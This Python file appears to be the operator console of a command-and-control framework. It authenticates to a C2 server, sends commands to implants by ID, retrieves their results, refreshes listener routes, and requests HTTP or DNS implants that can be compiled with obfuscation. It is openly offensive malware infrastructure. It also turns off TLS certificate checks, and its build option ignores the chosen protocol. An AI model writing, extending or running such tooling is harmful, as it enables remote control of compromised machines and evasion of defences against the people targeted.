import gc
import socket
import getpass
import ssl


def authenticate_user(uname_retr: str, pw_retr: str) -> str:
    """
    Authenticate a user and begin a session
    :param uname_retr: The username
    :param pw_retr: The associated password
    :return: A session token to use
    """
    # Create the socket
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    client_context.minimum_version = ssl.TLSVersion.TLSv1_3
    client_context.maximum_version = ssl.TLSVersion.TLSv1_3
    client_context.check_hostname = False
    client_context.verify_mode = ssl.CERT_NONE
    # Wrap it in SSL
    secure_client_socket = client_context.wrap_socket(
        client
    )
    # Connect
    try:
        secure_client_socket.connect(('localhost', 9999))
        subscribe_request = f"AUTH {uname_retr} {pw_retr}"
        secure_client_socket.send(subscribe_request.encode())
        response = secure_client_socket.recv(4096).decode()
        secure_client_socket.close()
        return response
    except Exception as e:
        print(f"error: {e}")


def unified_send(rtype, operator_name, session_token, imp_id = None, command = None, comp_proto = None, is_garbled = None):
    """
    Unified send function to send and receive info from the C2
    :param rtype: PUB, RTR, BLD, RFR
    :param operator_name: The name of the operator
    :param session_token: The operators session token
    :param imp_id: optional: The implant ID to send and retrieve info to/from
    :param command: optional: If sending a command then the command
    :param comp_proto: optional: If compiling an implant, the protocol to use
    :param is_garbled: optional: If compiling, whether or not to use garble to compile
    :return: server response
    """
    # Create the socket
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    client_context.minimum_version = ssl.TLSVersion.TLSv1_3
    client_context.maximum_version = ssl.TLSVersion.TLSv1_3
    client_context.check_hostname = False
    client_context.verify_mode = ssl.CERT_NONE
    # Wrap it in SSL
    secure_client_socket = client_context.wrap_socket(
        client
    )
    secure_client_socket.connect(('localhost', 9999))
    match rtype:
        case "PUB":
            publish_request = f"PUB {operator_name} {session_token} {imp_id} {command}"
        case "RTR":
            publish_request = f"RTR {operator_name} {session_token}"
        case "BLD":
            publish_request = f"BLD {operator_name} {session_token} {comp_proto} {is_garbled}"
        case "RFR":
            publish_request = f"RFR {operator_name} {session_token}"

    secure_client_socket.send(publish_request.encode())

    while True:
        response = secure_client_socket.recv(4096).decode()
        if not response:
            break
        print(f"Server response: {response}")
    # secure_client_socket.close()


if __name__ == "__main__":
    uname = input("Enter username: ")
    pw = getpass.getpass()
    session_token = authenticate_user(uname, pw)
    # Delete the sensitive data
    del pw
    # Garbage collect
    gc.collect()
    while True:
        choice = input("1: Interact or\n"
                       "2: Retrieve results or\n"
                       "3: Build an implant or \n"
                       "4: Refresh the listener routes \n"
                       "> ")
        match choice:
            case "1":
                implant_id = input("Enter implant ID: ")
                command = input("Enter command to send: ")
                unified_send("PUB", uname, session_token, implant_id, command)
            case "2":
                unified_send("RTR", uname, session_token)
            case "3":
                build_choice = input("HTTP or DNS > ")
                if build_choice.lower() != "http" and build_choice.lower() != "dns":
                    build_choice = input("Need HTTP/DNS > ")

                garbled = input("Compile with Garbler (y/n) > ").strip().lower()
                if garbled != "y" and garbled != "n":
                    garbled = input("Need y/n > ")
                unified_send("BLD", uname, session_token, " ", " ", "http", garbled)
            case "4":
                print("Refreshing routes")
                unified_send("RFR", uname, session_token)
            case _:
                print("Unexpected command \n")
